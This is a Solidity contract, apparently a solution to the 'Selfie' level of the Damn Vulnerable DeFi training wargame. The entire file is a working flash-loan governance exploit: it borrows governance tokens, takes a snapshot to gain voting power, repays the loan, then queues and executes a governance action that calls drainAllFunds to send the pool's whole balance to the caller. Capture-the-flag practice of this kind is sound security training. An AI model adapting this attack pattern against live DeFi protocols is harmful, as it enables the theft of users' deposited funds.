// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface SelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface SimpleGovernance {
    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);

    function executeAction(uint256 actionId) external payable;
}

interface DamnValuableTokenSnapshot {
    function snapshot() external returns (uint256);

    function transfer(address acount, uint256 amount) external;
}

contract selfie_Exploit {
    SelfiePool pool;
    SimpleGovernance governance;
    uint256 actId;

    constructor(address _address, address __address) {
        pool = SelfiePool(_address);
        governance = SimpleGovernance(__address);
    }

    function receiveTokens(address _address, uint256 amount) external {
        require(msg.sender == address(pool));
        DamnValuableTokenSnapshot(_address).snapshot();
        DamnValuableTokenSnapshot(_address).transfer(msg.sender, amount);
    }

    function setExploit(uint256 amount) public {
        pool.flashLoan(amount);
        actId = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", msg.sender),
            0
        );
    }

    function executeExploit() public {
        governance.executeAction(actId);
    }
}
